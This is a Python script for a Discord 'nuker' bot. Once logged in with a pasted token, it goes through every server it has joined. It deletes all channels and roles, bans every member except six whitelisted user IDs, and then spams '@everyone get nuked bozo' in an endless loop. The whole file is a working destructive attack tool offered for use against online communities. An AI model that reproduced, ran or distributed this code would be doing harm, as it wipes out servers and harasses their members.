import discord, os, asyncio
from discord.ext import commands

class Bot(commands.Bot):
    def __init__(self):
        super().__init__(command_prefix = "!", intents = discord.Intents.all())

client = Bot()

@client.event
async def on_ready():
    print("ok!")

    for g in client.guilds:
        for c in g.channels:
            try:
                await c.delete()
                await asyncio.sleep(0.2)

            except:
                pass

        for r in g.roles:
            try:
                await r.delete()
                await asyncio.sleep(0.2)

            except:
                pass

        for m in g.members:
            w = ["884178510321713172", "746849808504979488", "691410854037422093", "1013230277423812648", "621510533170069515", "719604963466018828"]

            if str(m.id) in w:
                continue

            try:
                await m.ban()
                await asyncio.sleep(0.2)

            except:
                pass

        c = await g.create_text_channel("l-bozo")

        while True:
            await c.send("@everyone get nuked bozo")
            await asyncio.sleep(0.2)

client.run("PASTE YOUR TOKEN HERE")
